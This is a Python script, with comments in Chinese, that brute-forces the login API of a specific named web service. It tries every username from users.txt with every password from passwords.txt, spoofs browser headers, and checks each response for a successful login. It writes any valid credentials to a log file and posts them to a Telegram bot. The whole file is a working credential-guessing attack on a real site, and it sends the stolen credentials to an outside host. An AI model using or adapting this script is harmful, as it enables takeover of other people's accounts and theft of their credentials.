import os
import requests
import time

LOGIN_URL = "https://my.yue.to/api/v1/passport/auth/login"
USER_FIELD = "email"
PWD_FIELD = "password"
REQUEST_INTERVAL = 1.0
RESULT_FILE_PATH = "success_log.txt"

# ==================== Telegram 配置 ====================
# 自动从 GitHub Secrets 或本地环境变量中读取电报配置
TELEGRAM_BOT_TOKEN = os.getenv("TG_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TG_CHAT_ID", "")

def send_telegram_msg(message):
    """发送 Telegram 通知消息"""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"[!] Telegram 推送失败: {e}")

def get_accounts():
    """直接读取本地 users.txt 文件"""
    if os.path.exists("users.txt"):
        with open("users.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return []

def get_passwords():
    """直接读取本地 passwords.txt 文件"""
    if os.path.exists("passwords.txt"):
        with open("passwords.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return []

def log_success(username, password):
    """记录成功凭据并触发电报推送"""
    with open(RESULT_FILE_PATH, "a", encoding="utf-8") as f:
        current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        f.write(f"[{current_time}] 成功: 账号={username} ---- 密码={password}\n")
    print(f"[+] 【成功记录】 {username} -> {password} 已保存")
    
    # 触发电报推送
    msg = f"🚨 *发现有效凭据* 🚨\n\n- 账号: `{username}`\n- 密码: `{password}`\n- 时间: `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
    send_telegram_msg(msg)

def is_login_success(response):
    """针对当前目标网站的成功判定逻辑"""
    if response.status_code != 200:
        return False
    try:
        data = response.json()
        if isinstance(data, dict):
            if "auth_data" in data or (isinstance(data.get("data"), dict) and "auth_data" in data["data"]):
                return True
            if data.get("status") == "success" or data.get("code") in [200, 0, "200", "success"]:
                return True
    except ValueError:
        pass
    text = response.text.lower()
    if "auth_data" in text or '"status":"success"' in text:
        return True
    return False

def main():
    usernames = get_accounts()
    passwords = get_passwords()
    
    if not usernames or not passwords:
        print("[!] 错误：未找到有效的账号字典(users.txt)或密码字典(passwords.txt)！")
        return

    print(f"[*] 全自动审计开始，共 {len(usernames)} 个账号，{len(passwords)} 个密码")
    print(f"[*] 目标: {LOGIN_URL}\n")

    with requests.Session() as session:
        for username in usernames:
            print(f"\n[*] ==================== 开始测试账号: {username} ====================")
            found = False

            for password in passwords:
                print(f"[-] 尝试: {username} : {password}")
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Referer": "https://my.yue.to/"
                }

                try:
                    payload = {USER_FIELD: username, PWD_FIELD: password}
                    response = session.post(LOGIN_URL, json=payload, headers=headers, timeout=6)

                    if is_login_success(response):
                        print(f"\n[+] 【找到正确密码】 {username} -> {password}")
                        log_success(username, password)
                        found = True
                        break
                except requests.exceptions.RequestException as e:
                    print(f"[!] 请求异常: {e}")

                time.sleep(REQUEST_INTERVAL)

            if not found:
                print(f"[-] 账号 {username} 未找到正确密码")

if __name__ == "__main__":
    main()
